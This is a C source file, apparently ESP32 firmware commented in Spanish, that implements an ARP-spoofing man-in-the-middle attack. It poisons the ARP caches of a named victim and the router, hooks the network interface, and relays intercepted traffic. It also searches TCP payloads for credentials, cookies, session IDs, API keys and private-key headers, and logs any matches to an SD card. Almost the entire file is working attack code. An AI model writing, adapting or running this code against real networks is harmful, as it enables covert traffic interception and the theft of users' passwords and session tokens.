#include "arp_spoof.h"

#define DELAY(ms) vTaskDelay(pdMS_TO_TICKS(ms))
const char* TAG = "ARP-SPOOF";
bool running;
uint8_t mac_to_spoof[6]; //Router
uint8_t target_mac[6]; // Victima
uint8_t ip_to_spoof[4]; //Router
uint8_t target_ip[4];//Victima
/* Para guardar el puntero original a la función input */ 
static err_t (*original_input)(struct pbuf *, struct netif *) = NULL;

char file_path[256];
int64_t start;
int64_t end;

char buffer[4096];
char* buf_p = buffer;
void turn_off(){
    running = false;
    printf("Estado: %d\n", running);
}
/* target 0:victim, 1:router */
void send_arp(struct netif *netif, int type, int target) { 
    struct pbuf *p;
    struct etharp_hdr *arp_reply;
    p = pbuf_alloc(PBUF_RAW, sizeof(struct etharp_hdr) + SIZEOF_ETH_HDR, PBUF_RAM);
    if (!p) {
        ESP_LOGE(TAG, "Error assigning pbuf");
        return;
    }
    struct eth_hdr *ethhdr = (struct eth_hdr *)p->payload;
    arp_reply = (struct etharp_hdr *)(ethhdr + 1);
    const uint8_t *esp_mac = netif->hwaddr;
    /* Ethernet header */
    if (target == 0){
        /* Víctima */
        MEMCPY(ethhdr->dest.addr, target_mac, ETH_HWADDR_LEN); 
    } else if (target == 1){
        /* Router */
        MEMCPY(ethhdr->dest.addr, mac_to_spoof, ETH_HWADDR_LEN); 
    }
    MEMCPY(ethhdr->src.addr, esp_mac, ETH_HWADDR_LEN);
    ethhdr->type = PP_HTONS(ETHTYPE_ARP);
    /* Mensaje ARP */
    arp_reply->hwtype = PP_HTONS(1);
    arp_reply->proto = PP_HTONS(ETHTYPE_IP);
    arp_reply->hwlen = ETH_HWADDR_LEN;
    arp_reply->protolen = sizeof(ip4_addr_t);
    if (type == 0){
        arp_reply->opcode = PP_HTONS(ARP_REPLY);
    }else if (type == 1){
        arp_reply->opcode = PP_HTONS(ARP_REQUEST);
    }
    /* MAC */
    MEMCPY(arp_reply->shwaddr.addr, esp_mac, ETH_HWADDR_LEN); //MAC ESP
    if (target == 0)
        MEMCPY(arp_reply->dhwaddr.addr, target_mac, ETH_HWADDR_LEN); //MAC victim
    else if (target == 1)
        MEMCPY(arp_reply->dhwaddr.addr, mac_to_spoof, ETH_HWADDR_LEN); //MAC router
    /* IP */
    if (target == 0){
        MEMCPY(&arp_reply->sipaddr, ip_to_spoof, sizeof(ip4_addr_t)); //Source: spoofed ip
        MEMCPY(&arp_reply->dipaddr, target_ip, sizeof(ip4_addr_t)); //Dest: IP victim
    } else if (target == 1){
        /* Impersonating victim to router */
        MEMCPY(&arp_reply->sipaddr, target_ip, sizeof(ip4_addr_t)); //Source: Victim spoofed
        MEMCPY(&arp_reply->dipaddr, ip_to_spoof, sizeof(ip4_addr_t)); //Dest: router
    } 
    /* Enviar ARP */
    err_t err = netif->linkoutput(netif, p);
    if (err != ERR_OK) {
        ESP_LOGE(TAG, "Error sending ARP Rep/req: %d", err);
    } 
    pbuf_free(p);
}
/* Conjunto pequeño o grande de palabras clave */
//char * key_words [] = {"USER", "PASS", "username", "password", "220"};
char *key_words[] = {
    // Autenticación básica
    "USER", "PASS", "username", "password", "login", "signin", "auth", "authentication",

    // Variantes comunes
    "USERNAME", "PASSWORD", "user", "pass", "usr", "pwd", "login:", "pass:",

    // Encabezados HTTP relacionados
    "Authorization", "Set-Cookie", "Cookie", "Bearer", "Basic", "Token", "access_token", "refresh_token",

    // SMTP/IMAP/POP3/Telnet
    "AUTH LOGIN", "AUTH PLAIN", "AUTH CRAM-MD5", "AUTH XOAUTH2", 
    "LOGIN", "PASS", "AUTH", "MAIL FROM", "RCPT TO",

    // FTP específicos
    "220", "331", "230", "530", "USER", "PASS", "SYST",

    // SSH o sistemas con clave pública/privada
    "private_key", "public_key", "ssh-rsa", "BEGIN RSA", "BEGIN OPENSSH", "BEGIN PRIVATE KEY",

    // Tokens y sesiones
    "sessionid", "JSESSIONID", "PHPSESSID", "ASP.NET_SessionId", "X-CSRF-Token", "X-Auth-Token",

    // Formularios web o APIs
    "email", "e-mail", "mail", "secret", "key", "apikey", "api_key", "client_id", "client_secret",

    // Indicadores de intentos de autenticación fallidos
    "denied", "unauthorized", "invalid credentials", "failed login",

    // Otras palabras clave sospechosas
    "grant_type", "scope", "credentials", "login_token", "reset_password", "change_password"
};
void filter_info(char* payload){
    /* Filtrar la información segun un conjunto de palabras clave */
    for (int i = 0; i < sizeof(key_words)/sizeof(char*); i++){
        char* p = strstr(payload, key_words[i]);
        if (p){
            printf("%32s\n", p);
            char data[34]; 
            snprintf(data, sizeof(data), "%32s\n", p);
            sd_write_file(file_path, data);
        }
    }
}

void extract_info(struct pbuf *p){
    struct eth_hdr *ethhdr;
    struct ip_hdr *iphdr;
    struct tcp_hdr *tcphdr;
    void *payload;
    /* Obtener cabecera Ethernet */
    ethhdr = (struct eth_hdr *)p->payload;
    if (htons(ethhdr->type) == ETHTYPE_IP) {
        /* Obtener cabecera IP */
        iphdr = (struct ip_hdr *)((uint8_t *)p->payload + SIZEOF_ETH_HDR); 
        if (IPH_PROTO(iphdr) ==  IP_PROTO_TCP) { // TCP
            /* Obtener paquete TCP */
            tcphdr = (struct tcp_hdr *)((uint8_t *)iphdr + (IPH_HL(iphdr) * 4));
            /* Obtener payload del paquete TCP */
            payload = (uint8_t *)tcphdr + (TCPH_HDRLEN(tcphdr) * 4);
            filter_info((char*)payload);
        }
    }
}

void route_packet(struct pbuf *p, struct netif *netif){
    struct eth_hdr *ethhdr = (struct eth_hdr *)p->payload;
    const uint8_t *esp_mac = netif->hwaddr;
    /* Paquete proviene de la víctima */
    if (memcmp(ethhdr->src.addr, target_mac, 6) == 0){
        MEMCPY(ethhdr->src.addr, esp_mac, ETH_HWADDR_LEN);
        MEMCPY(ethhdr->dest.addr, mac_to_spoof, ETH_HWADDR_LEN);
    }
    /* Paquete proviene del router */
    if (memcmp(ethhdr->src.addr, mac_to_spoof, 6) == 0){
        MEMCPY(ethhdr->src.addr, esp_mac, ETH_HWADDR_LEN);
        MEMCPY(ethhdr->dest.addr, target_mac, ETH_HWADDR_LEN);
    }
    err_t err = netif->linkoutput(netif, p);
    /* Manejo de multiples errores*/
    if (err != ERR_OK) {
        if (err == ERR_MEM) {
            ESP_LOGW(TAG, "Error routing: ERR_MEM - Memoria insuficiente, probablemente buffers llenos.");
        } 
        else if (err == ERR_BUF) {
            ESP_LOGW(TAG, "Error routing: ERR_BUF - No hay espacio en el buffer de envío.");
        } 
        else if (err == ERR_TIMEOUT) {
            ESP_LOGW(TAG, "Error routing: ERR_TIMEOUT - Timeout en la operación de envío.");
        } 
        else if (err == ERR_RTE) {
            ESP_LOGW(TAG, "Error routing: ERR_RTE - No hay ruta para el destino.");
        } 
        else if (err == ERR_VAL) {
            ESP_LOGW(TAG, "Error routing: ERR_VAL - Parámetro no válido.");
        } 
        else if (err == ERR_IF) {
            ESP_LOGW(TAG, "Error routing: ERR_IF - Error en la interfaz de red.");
        } 
        else if (err == ERR_ABRT) {
            ESP_LOGW(TAG, "Error routing: ERR_ABRT - Conexión abortada.");
        } 
        else if (err == ERR_RST) {
            ESP_LOGW(TAG, "Error routing: ERR_RST - Conexión reiniciada.");
        } 
        else if (err == ERR_CLSD) {
            ESP_LOGW(TAG, "Error routing: ERR_CLSD - Conexión cerrada.");
        } 
        else if (err == ERR_CONN) {
            ESP_LOGW(TAG, "Error routing: ERR_CONN - No conectado.");
        } 
        else {
            ESP_LOGW(TAG, "Error routing: Código desconocido (%d)", err);
        }
    }
    
}
/* Función para tratar paquetes recibidos */
err_t my_ethernet_input(struct pbuf *p, struct netif *netif) {
    struct eth_hdr *ethhdr = (struct eth_hdr *)p->payload;
    if (ethhdr->type == PP_HTONS(ETHTYPE_ARP)) {
        struct etharp_hdr *arphdr = (struct etharp_hdr *)((u8_t *)ethhdr + SIZEOF_ETH_HDR);
        if (arphdr->opcode == PP_HTONS(ARP_REQUEST)) {
            ESP_LOGI(TAG, "ARP REQUEST from: %x:%x:%x:%x:%x:%x", arphdr->shwaddr.addr[0], arphdr->shwaddr.addr[1], arphdr->shwaddr.addr[2], 
                arphdr->shwaddr.addr[3], arphdr->shwaddr.addr[4], arphdr->shwaddr.addr[5]);
            /* Si proviene de la víctima */
            if (memcmp(arphdr->shwaddr.addr, target_mac, 6) == 0){
                /* Enviar REPLY a la víctima para competir contra el router */
                send_arp(netif, 0, 0);
                ESP_LOGI(TAG, "SENT ARP REPLY TO VICTIM");
            }
            /* Si proviene del router */
            if (memcmp(arphdr->shwaddr.addr, mac_to_spoof, 6) == 0){
                ESP_LOGI(TAG, "SENT ARP REQUEST TO VICTIM");
                send_arp(netif, 1, 0); //Request a la vicima, compete with the router
                ESP_LOGI(TAG, "SENT ARP REPLY TO ROUTER");
                send_arp(netif, 0, 1); // Reply al router, compete with the victim
            }
        }
    }
    else if (ethhdr->type == PP_HTONS(ETHTYPE_IP)) {
        /* Extraer información del paquete */
        extract_info(p);
        /* Enrutar para mantener la conexión */
        route_packet(p, netif);
    }
    /* Enviar paquete a la pila lwIP */
    return netif_input(p, netif); 
}

void parse_ip(const char *ip_str, uint8_t ip[4]) {
    int temp[4];
    if (sscanf(ip_str, "%d.%d.%d.%d", &temp[0], &temp[1], &temp[2], &temp[3]) == 4) {
        for (int i = 0; i < 4; i++) {
            ip[i] = (uint8_t)temp[i];
        }
    } else {
        ESP_LOGE(TAG, "Formato de IP inválido");
    }
}

void parse_mac(const char* mac_str, uint8_t mac[6]) {
    int temp[6];
    if (sscanf(mac_str, "%x:%x:%x:%x:%x:%x", &temp[0], &temp[1], &temp[2], &temp[3], &temp[4], &temp[5]) == 6) {
        for (int i = 0; i < 6; i++) {
            mac[i] = (uint8_t)temp[i];
        }
    } else {
        ESP_LOGE(TAG, "Formato de MAC inválido");
    }
}
void arp_spoof(char* target, char* to_spoof, char* target_mac_string, char* to_spoof_mac_string){
    if (connected_to_wifi){
        /* Guardamos el timestamp antes de modificar las interfaces de red*/
        char timestamp[64];
        get_timestamp(timestamp); 

        struct netif *netif = netif_default;
        /* Guardar el input original */
        if (original_input == NULL) {
            original_input = netif->input;
        }
        /* Para manejar respuestas */
        netif->input = my_ethernet_input;
        /* Cambio de formato */
        parse_ip(target, target_ip);
        parse_ip(to_spoof, ip_to_spoof);
        parse_mac(target_mac_string, target_mac);
        parse_mac(to_spoof_mac_string, mac_to_spoof);

        start = esp_timer_get_time();
        /* Titulo resultados */
        snprintf(file_path, sizeof(file_path), "results/mitm/mitm-%s.txt", timestamp);
        char data[256];
        snprintf(data, sizeof(data), "SNIFFING: %s - %s\n", target, target_mac_string);
        sd_write_file(file_path, data);
        /* Enviar REPLY a la víctima */
        send_arp(netif, 0, 0); 
        /* Enviar REPLY al router */
        send_arp(netif, 0, 1);
        running = true;
        while (running && connected_to_wifi){
            /* Envio de REQUEST periódico a víctima y a router */
            send_arp(netif, 1, 0);
            send_arp(netif, 1, 1);
            DELAY(5000);
        }
        /* Restaurar interfaz original */
        if (original_input != NULL) {
            netif->input = original_input;
            original_input = NULL;
        }
        end = esp_timer_get_time();
    }
    else{
        ESP_LOGE(TAG, "No hay red");
    }
}
